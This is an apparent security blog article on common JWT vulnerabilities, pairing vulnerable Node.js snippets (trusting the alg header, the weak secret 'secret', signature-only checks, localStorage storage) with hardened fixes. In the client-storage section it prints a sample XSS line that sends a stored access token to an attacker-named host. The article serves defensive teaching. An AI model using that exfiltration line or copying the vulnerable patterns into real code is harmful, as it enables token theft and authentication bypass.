---
title: "Common JWT Vulnerabilities and How to Prevent Them"
description: "Discover the most common JWT security vulnerabilities including algorithm confusion, weak secrets, and missing validation."
date: "2025-01-05"
author: "JWT Decoder Team"
tags: ["Security", "JWT", "Vulnerabilities", "Best Practices"]
readTime: "10 min read"
---

## Top 5 JWT Vulnerabilities

JSON Web Tokens (JWTs) are everywhere: single sign-on, mobile APIs, microservices, and more. They’re convenient—but also easy to get wrong. A small misconfiguration can give an attacker full control over your authentication layer.

In this article, we’ll walk through the **top 5 JWT vulnerabilities**, how they work, and how to fix them, with code examples along the way.

We’ll mostly use **Node.js/Express** and the [`jsonwebtoken`](https://www.npmjs.com/package/jsonwebtoken) library for examples, but the concepts apply to any language.

---

### 1. Algorithm Confusion Attack

**The problem:**
JWTs support multiple algorithms (e.g., `HS256` for symmetric HMAC, `RS256` for asymmetric RSA). If the server **trusts the `alg` field from the token header** without enforcing a specific algorithm, an attacker can:

1. Take a token signed with an **RSA private key** (`RS256`).
2. Change the header to use `HS256`.
3. Use the **public key** (which might be exposed) as the HMAC secret to forge a valid token.

This is called an **algorithm confusion attack**.

#### Vulnerable verification (Node.js)

```js
const jwt = require("jsonwebtoken");

// ❌ Vulnerable: does NOT restrict algorithms
function verifyToken(token, publicKey) {
  try {
    const payload = jwt.verify(token, publicKey); // alg from header is trusted
    return payload;
  } catch (err) {
    throw new Error("Invalid token");
  }
}
```

If an attacker changes the header:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Then uses the RSA public key as an HMAC secret, they may be able to generate a valid token that passes this verification.

#### Safe verification

**Always** hardcode the allowed algorithms on the backend and never trust the token header.

```js
const jwt = require("jsonwebtoken");

// ✅ Safe: explicitly allow only RS256
function verifyToken(token, publicKey) {
  try {
    const payload = jwt.verify(token, publicKey, {
      algorithms: ["RS256"],
    });
    return payload;
  } catch (err) {
    throw new Error("Invalid token");
  }
}
```

If you use `HS256`:

```js
const SECRET = process.env.JWT_SECRET;

// ✅ Safe: only HS256 is allowed
function verifyToken(token) {
  return jwt.verify(token, SECRET, {
    algorithms: ["HS256"],
  });
}
```

**Key takeaways:**

* Never let the **client choose the algorithm**.
* **Enforce allowed algorithms** in your verification code.
* Prefer **asymmetric keys (RS256 / ES256)** for critical auth flows.

---

### 2. Weak or Leaked Secrets

For HMAC algorithms like `HS256`, JWTs are signed with a **shared secret**. If that secret is:

* Too short,
* Guessable (`"secret"`, `"password"`, app name, etc.), or
* Checked into version control,

then an attacker can **brute-force or steal the secret** and forge arbitrary tokens.

#### Vulnerable configuration

```js
// ❌ Extremely weak secret
const jwt = require("jsonwebtoken");
const SECRET = "secret"; // or "myapp", "123456", etc.

function issueToken(user) {
  return jwt.sign(
    { sub: user.id, role: user.role },
    SECRET,
    { algorithm: "HS256", expiresIn: "1h" }
  );
}
```

This secret could be brute-forced with common wordlists.

#### Safer configuration

Use **long, random secrets**, ideally generated and managed by a secret manager (AWS Secrets Manager, Vault, etc.).

```bash
# Example: generate a strong secret (Linux/macOS)
openssl rand -hex 64
# => 128-hex-char random secret
```

```js
// ✅ Strong secret, loaded from environment
const SECRET = process.env.JWT_SECRET; // e.g. 64+ random bytes

function issueToken(user) {
  return jwt.sign(
    { sub: user.id, role: user.role },
    SECRET,
    { algorithm: "HS256", expiresIn: "1h" }
  );
}
```

**Additional hardening:**

* Rotate secrets periodically (e.g., using a key ID `kid` and a JWKS endpoint).
* Immediately rotate secrets if **you suspect a leak** (e.g., Git history, logs, screenshots).
* Limit secret access via **least privilege**.

---

### 3. Missing or Incorrect Token Validation

Another common mistake: assuming that if `jwt.verify` doesn’t throw, the token is “good enough.”

In reality, you **must validate more than just the signature**:

* `exp` (expiration time)
* `nbf` (not before)
* `iss` (issuer)
* `aud` (audience)
* `sub` (subject) format
* Custom claims (e.g., role, scopes)

#### Vulnerable verification (only checks signature)

```js
// ❌ Only checks signature; accepts any issuer, audience, etc.
function verifyToken(token) {
  return jwt.verify(token, process.env.JWT_SECRET);
}
```

An attacker could replay tokens intended for a different client, or use tokens from a different environment (dev/staging) against production if the same secret/key is reused.

#### Safe verification with claim checks

```js
const jwt = require("jsonwebtoken");

const SECRET = process.env.JWT_SECRET;
const EXPECTED_ISS = "https://auth.example.com";
const EXPECTED_AUD = "my-api";

function verifyToken(token) {
  const payload = jwt.verify(token, SECRET, {
    algorithms: ["HS256"],
    issuer: EXPECTED_ISS,
    audience: EXPECTED_AUD,
  });

  // Optional: additional custom checks
  if (!payload.sub) {
    throw new Error("Missing subject");
  }

  if (payload.role !== "user" && payload.role !== "admin") {
    throw new Error("Invalid role");
  }

  return payload;
}
```

**Important notes:**

* `jwt.verify` will automatically check `exp` and `nbf` if they’re present.
* Always validate **issuer** and **audience** in multi-tenant or third-party auth scenarios (e.g., OAuth/OIDC).
* Avoid putting **sensitive data** (e.g., passwords, secrets, credit card numbers) in JWT claims—tokens are only **Base64URL-encoded**, not encrypted.

---

### 4. No Revocation or Blacklisting Strategy

JWTs are often used as **stateless** tokens: once issued, the server doesn’t store them. This makes them scalable but causes a problem:

> “What if I need to revoke a token *before* it expires?”

Examples:

* User changes their password.
* User is disabled / deleted.
* Suspicious login detected.
* Token leak is suspected.

If you **only** rely on `exp`, a stolen token may remain valid until it expires.

#### Naive stateless approach

```js
// ❌ No revocation possible without changing secret or key
function verifyToken(token) {
  return jwt.verify(token, process.env.JWT_SECRET);
}
```

#### Strategy 1: Short-lived access tokens + refresh tokens

Issue very short-lived access tokens (e.g. 5–15 minutes) and a longer-lived refresh token stored more carefully.

```js
// Access token (short-lived)
function issueAccessToken(userId) {
  return jwt.sign(
    { sub: userId, type: "access" },
    process.env.JWT_SECRET,
    { algorithm: "HS256", expiresIn: "15m" }
  );
}

// Refresh token (longer-lived, stored server-side or in a secure store)
function issueRefreshToken(userId, jti) {
  return jwt.sign(
    { sub: userId, type: "refresh", jti },
    process.env.JWT_SECRET,
    { algorithm: "HS256", expiresIn: "7d" }
  );
}
```

Store the `jti` (token ID) of refresh tokens in a database and mark them as revoked when needed.

#### Strategy 2: Maintain a blacklist / blocklist

For high-security systems, you can blacklist tokens (or their `jti`) until they expire.

```js
// Pseudo-code with Redis
const redis = require("redis");
const client = redis.createClient();

async function isTokenRevoked(jti) {
  const revoked = await client.get(`revoked:${jti}`);
  return !!revoked;
}

async function revokeToken(jti, expTimestamp) {
  const ttl = expTimestamp - Math.floor(Date.now() / 1000);
  if (ttl > 0) {
    await client.set(`revoked:${jti}`, "1", "EX", ttl);
  }
}

function verifyToken(token) {
  const payload = jwt.verify(token, process.env.JWT_SECRET, {
    algorithms: ["HS256"],
  });

  if (!payload.jti) {
    throw new Error("Token missing jti");
  }

  return isTokenRevoked(payload.jti).then((revoked) => {
    if (revoked) {
      throw new Error("Token revoked");
    }
    return payload;
  });
}
```

**Key points:**

* JWTs are **not inherently revocable**—you must design revocation.
* Use **short lifetimes**, **refresh tokens**, and/or a **revocation list**.
* Revoke OR invalidate tokens upon **critical security events**.

---

### 5. Insecure Storage on Client Side

Even if your JWT is perfectly signed and validated, your app is vulnerable if you **store tokens in the wrong place** on the client.

Common pitfalls:

* Storing JWTs in `localStorage` or `sessionStorage` → exposed to **XSS**.
* Storing long-lived tokens in insecure cookies → risk of theft via **CSRF** if not handled properly.

#### Risky storage example (SPA)

```js
// ❌ Vulnerable: localStorage is accessible from any injected script
localStorage.setItem("access_token", token);

// Later:
const token = localStorage.getItem("access_token");
```

If an attacker can execute JavaScript in your origin (via XSS), they can exfiltrate the token:

```js
// Example of malicious code injected via XSS
fetch("https://attacker.example.com/steal", {
  method: "POST",
  body: localStorage.getItem("access_token"),
});
```

#### Safer approaches

1. **HTTP-only, secure cookies** for session-like JWTs.

    * Mark cookies with:

        * `HttpOnly` → not accessible via `document.cookie`
        * `Secure` → only sent over HTTPS
        * `SameSite=Lax` or `Strict` → mitigates CSRF

2. **In-memory storage** for access tokens in SPAs, plus a secure refresh mechanism.

    * Store the access token in memory (e.g., in a React state/store).
    * Use a refresh token in an HTTP-only cookie to get new access tokens.

##### Example: setting secure HTTP-only cookie (Node.js/Express)

```js
// After successful login
app.post("/login", (req, res) => {
  const userId = "123";
  const token = jwt.sign(
    { sub: userId },
    process.env.JWT_SECRET,
    { algorithm: "HS256", expiresIn: "15m" }
  );

  res.cookie("access_token", token, {
    httpOnly: true,
    secure: true,      // Use HTTPS
    sameSite: "Strict" // or "Lax" depending on your flow
  });

  res.json({ success: true });
});
```

**Defense in depth:**

* Harden your app against **XSS** (CSP, input sanitization, React/Vue/Angular templating, no dangerous `innerHTML`).
* Harden against **CSRF** (SameSite cookies, CSRF tokens, double-submit, etc.).
* Avoid storing long-lived JWTs in locations that JavaScript can read.

---

## Bonus: The “none” Algorithm Issue (Historic but Important)

Older or poorly implemented JWT libraries sometimes accepted `alg: "none"` as a valid algorithm and treated the token as already “verified”. While most modern libraries have fixed this, it’s still worth mentioning.

Vulnerable header:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

If the server doesn’t reject this, an attacker could send **unsigned tokens** that are treated as authenticated.

Make sure your JWT library:

* **Does not** accept `"none"` by default.
* Or you explicitly **disallow** it (e.g., by restricting algorithms as shown earlier).

---

## Summary & Best Practices

To keep JWT usage safe in your applications:

1. **Enforce algorithms**

    * Don’t trust the `alg` header; configure allowed algorithms in your server code.

2. **Use strong keys/secrets**

    * Generate random, long secrets or key pairs.
    * Protect them with a proper secret management system.

3. **Validate all relevant claims**

    * Check `iss`, `aud`, and `exp` at minimum.
    * Validate your custom claims and never store highly sensitive data in JWT payloads.

4. **Plan for revocation**

    * Use short-lived access tokens and refresh tokens.
    * Implement revocation lists or rotation strategies.

5. **Store tokens securely on the client**

    * Prefer HTTP-only secure cookies or in-memory storage with a robust refresh flow.
    * Harden your app against XSS and CSRF.

Used correctly, JWTs are powerful and scalable. Used carelessly, they can quietly undermine your entire authentication architecture. Treat them like you would any other critical security component: with strict validation, strong keys, and defense in depth.
